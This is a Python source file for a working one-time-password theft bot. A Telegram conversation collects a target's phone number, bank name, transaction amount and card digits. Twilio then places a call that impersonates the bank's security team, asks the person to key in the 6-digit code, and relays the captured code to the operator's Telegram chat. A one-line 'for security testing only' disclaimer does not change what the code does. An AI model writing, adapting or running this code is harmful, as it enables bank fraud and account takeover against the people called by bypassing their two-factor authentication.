import os
import requests
from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
from telegram import Update, Bot
from telegram.ext import Dispatcher, CommandHandler, ConversationHandler, MessageHandler, filters

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')

# Conversation states
PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)

# Store user data temporarily
user_data = {}

app = Flask(__name__)
bot = Bot(token=TELEGRAM_TOKEN)
dispatcher = Dispatcher(bot, None, use_context=True)

# ==================== TELEGRAM HANDLERS ====================
async def start(update, context):
    await update.message.reply_text(
        "🔐 *OTP Testing Bot*\n\nSend /call to start.\n\n*For security testing only.*",
        parse_mode='Markdown'
    )

async def call_command(update, context):
    user_id = update.effective_user.id
    user_data[user_id] = {}
    await update.message.reply_text("📞 Send phone number (e.g., +447123456789)")
    return PHONE

async def get_phone(update, context):
    user_id = update.effective_user.id
    user_data[user_id]['phone'] = update.message.text.strip()
    await update.message.reply_text("🏦 Send bank name")
    return BANK

async def get_bank(update, context):
    user_id = update.effective_user.id
    user_data[user_id]['bank'] = update.message.text.strip()
    await update.message.reply_text("💰 Send transaction amount")
    return AMOUNT

async def get_amount(update, context):
    user_id = update.effective_user.id
    user_data[user_id]['amount'] = update.message.text.strip()
    await update.message.reply_text("💳 Send last 4 digits of card")
    return CARD_LAST4

async def get_card_last4(update, context):
    user_id = update.effective_user.id
    user_data[user_id]['card_last4'] = update.message.text.strip()
    
    data = user_data[user_id]
    phone = data['phone']
    bank = data['bank']
    amount = data['amount']
    card_last4 = data['card_last4']
    chat_id = update.effective_chat.id
    
    await update.message.reply_text(f"📞 Calling {phone}...\nBank: {bank}\nAmount: ${amount}\nCard ending: {card_last4}")
    
    try:
        call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
        await update.message.reply_text(f"✅ Call initiated! Waiting for OTP...")
    except Exception as e:
        await update.message.reply_text(f"❌ Call failed: {str(e)}")
    
    return ConversationHandler.END

async def cancel(update, context):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
    client = Client(TWILIO_SID, TWILIO_AUTH)
    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
    call = client.calls.create(to=to_number, from_=TWILIO_FROM, url=voice_url, method='POST')
    return call.sid

# ==================== FLASK ENDPOINTS ====================
@app.route("/webhook", methods=['POST'])
def telegram_webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return "ok", 200

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    
    if 'Digits' in request.values:
        digits = request.values['Digits']
        chat_id = request.args.get('chat_id')
        if chat_id:
            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
        response.say("Thank you. Goodbye.")
        response.hangup()
        return str(response)
    
    bank_name = request.args.get('bank', 'your bank')
    amount = request.args.get('amount', '500')
    card_last4 = request.args.get('card_last4', '1234')
    
    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
    gather.say(f"Hello. This is an automated security call from {bank_name}.")
    gather.say(f"We detected a transaction of {amount} dollars on card ending in {card_last4}.")
    gather.say("Please enter the 6-digit code sent to your phone.")
    response.append(gather)
    
    return str(response)

@app.route("/")
def index():
    return "OTP Bot is running."

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': chat_id, 'text': text})
    except:
        pass

# ==================== REGISTER HANDLERS ====================
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('call', call_command)],
    states={
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
        AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
        CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)
dispatcher.add_handler(CommandHandler('start', start))
dispatcher.add_handler(conv_handler)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
